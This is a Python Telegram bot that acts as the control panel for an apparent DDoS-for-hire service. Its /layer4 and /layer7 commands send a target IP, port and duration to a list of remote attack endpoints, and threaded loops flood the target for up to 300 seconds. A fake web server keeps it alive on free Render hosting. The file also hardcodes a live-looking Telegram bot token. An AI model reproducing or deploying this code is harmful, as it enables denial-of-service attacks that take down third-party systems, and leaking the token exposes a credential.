import time
import requests
import asyncio
import socket
import http.server
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
from threading import Thread, Lock

# المتغيرات لتخزين حالة الهجوم
attack_status = {}
attack_sites = {}
bot_token = "7157656859:AAFS8DDWpwWM_WgIi5wd6rum7wSaX4StSH8"

# تحديد الـ chat_id المسموح له باستخدام البوت
ALLOWED_CHAT_ID = [1254652875]  # ضع هنا الـ chat_id الذي تريد السماح له باستخدام البوت

# المتغيرات للتحكم في حالة الهجوم
attack_lock = Lock()
attack_in_progress = False  # متغير لتتبع حالة الهجوم
last_attack_time = time.time()  # وقت الهجوم الأخير

# خادم وهمي لإرضاء خطة Render المجانية
def run_mock_server():
    server_address = ('', 8080)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    print("Mock server running on port 8080...")
    httpd.serve_forever()

# قراءة المواقع من ملف "sites.txt"
def read_sites():
    with open("sites312.txt", "r") as file:
        sites = [line.strip() for line in file.readlines()]
    return sites

# وظيفة لتنفيذ الهجوم على الموقع
def attack_site(site, ip, port, attack_time):
    global attack_in_progress
    start_time = time.time()
    end_time = start_time + attack_time

    if not site.startswith("http://") and not site.startswith("https://"):
        site = "http://" + site  

    while time.time() < end_time:
        try:
            url = f"{site}?host={ip}&port={port}&time={attack_time}"
            response = requests.get(url, timeout=20)
            if response.status_code != 200:
                print(f"Site {site} returned status {response.status_code}. Retrying...")
                continue  
        except requests.exceptions.Timeout:
            print(f"Timeout occurred while attacking {site}. Retrying...")
            continue
        except requests.exceptions.RequestException as e:
            print(f"Error with site {site}: {e}")
            continue  

        time.sleep(2)

    attack_status[site] = {
        'status': 'Completed',
        'time_taken': round(time.time() - start_time, 2),
        'end_time': end_time,
        'total_time': attack_time  
    }
    
    attack_in_progress = False

# وظيفة لزيارة المواقع و تعبئة البيانات
def visit_and_fill_data(site, ip, attack_time):
    global attack_in_progress
    start_time = time.time()
    end_time = start_time + attack_time

    if not site.startswith("http://") and not site.startswith("https://"):
        site = "http://" + site  

    while time.time() < end_time:
        try:
            url = f"{site}?host1={ip}&time1={attack_time}"  
            response = requests.get(url, timeout=20)
            if response.status_code != 200:
                print(f"Site {site} returned status {response.status_code}. Retrying...")
                continue  
        except requests.exceptions.Timeout:
            print(f"Timeout occurred while visiting {site}. Retrying...")
            continue
        except requests.exceptions.RequestException as e:
            print(f"Error with site {site}: {e}")
            continue  

        time.sleep(2)

    attack_status[site] = {
        'status': 'Visited and data filled',
        'time_taken': round(time.time() - start_time, 2),
        'end_time': end_time,
        'total_time': attack_time  
    }
    
    attack_in_progress = False

# وظيفة /list لعرض الأوامر
async def list_commands(update: Update, context: CallbackContext):
    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return

    await update.message.reply_text("""
    Available commands:
    /list - Show available commands.
    /layer4 <ip> <port> <time> - Start attack on sites.
    /layer7 <url> <time> - Visit sites and fill data.
    """)

# وظيفة /attack لتنفيذ الهجوم
async def resolve_hostname(ip):
    try:
        hostname = socket.gethostbyaddr(ip)[0]  
        return hostname if hostname != ip else None  
    except Exception:
        return None  

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, last_attack_time
    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ This bot is for DonRoad group.")
        return

    current_time = time.time()
    if current_time - last_attack_time < 10:  
        await update.message.reply_text("⚠️ Please wait 3 minutes before starting another attack.")
        return

    if attack_in_progress:
        await update.message.reply_text("⚠️ An attack is already in progress. Please wait until it finishes.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /layer4 <ip> <port> <time>")
        return

    try:
        time_duration = int(context.args[2])
        if time_duration > 300:
            await update.message.reply_text("❌ The attack time cannot exceed 300 seconds.")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid time format. Please provide a valid number.")
        return

    ip = context.args[0]
    port = int(context.args[1])

    protocol = "https" if port == 443 else "http"

    domain = await resolve_hostname(ip)
    target = domain if domain else ip  
    target_url = f"{protocol}://{target}"

    keyboard = [
        [InlineKeyboardButton("Checkhost", url=f"https://check-host.net{target_url}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    sites = read_sites()
    attack_in_progress = True

    await update.message.reply_text(
        f"🚀 The attack has started ... 📡\nNumber of servers running in the attack {len(sites)}",
        reply_markup=reply_markup
    )

    for site in sites:
        attack_sites[site] = 'Running'
        thread = Thread(target=attack_site, args=(site, ip, port, time_duration), daemon=True)
        thread.start()

    last_attack_time = current_time  

# وظيفة /filldata لزيارة المواقع و تعبئة البيانات
async def fill_data(update: Update, context: CallbackContext):
    global attack_in_progress, last_attack_time
    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ This bot is for DonRoad group.")
        return

    if attack_in_progress:
        await update.message.reply_text("⚠️ Another operation is in progress. Please wait until it finishes.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Usage: /layer7 <url> <time>")
        return

    try:
        time_duration = int(context.args[1])
        if time_duration > 300:
            await update.message.reply_text("❌ The attack time cannot exceed 300 seconds.")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid time format. Please provide a valid number.")
        return

    ip = context.args[0]

    current_time = time.time()
    if current_time - last_attack_time < 10:
        await update.message.reply_text("⚠️ Please wait 3 minutes before starting another attack.")
        return

    sites = read_sites()
    attack_in_progress = True

    await update.message.reply_text(
        f"🚀 Visiting sites and filling data ... 📡\nNumber of sites to visit: {len(sites)}"
    )

    for site in sites:
        attack_sites[site] = 'Running'
        thread = Thread(target=visit_and_fill_data, args=(site, ip, time_duration), daemon=True)
        thread.start()

    last_attack_time = time.time()  

# وظيفة لبدء البوت
async def start(update: Update, context: CallbackContext):
    if update.message.chat.id not in ALLOWED_CHAT_ID:
        await update.message.reply_text("❌ This bot is for DonRoad group.")
        return

    await update.message.reply_text("Welcome! Use /list for available commands.")

# إعداد البوت
def main():
    # تشغيل الخادم الوهمي في الخلفية لإرضاء Render
    threading.Thread(target=run_mock_server, daemon=True).start()

    application = Application.builder().token(bot_token).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("list", list_commands))
    application.add_handler(CommandHandler("layer4", attack))
    application.add_handler(CommandHandler("layer7", fill_data))
    
    application.add_handler(MessageHandler(filters.TEXT, lambda update, context: None))

    application.run_polling()

if __name__ == '__main__':
    main()
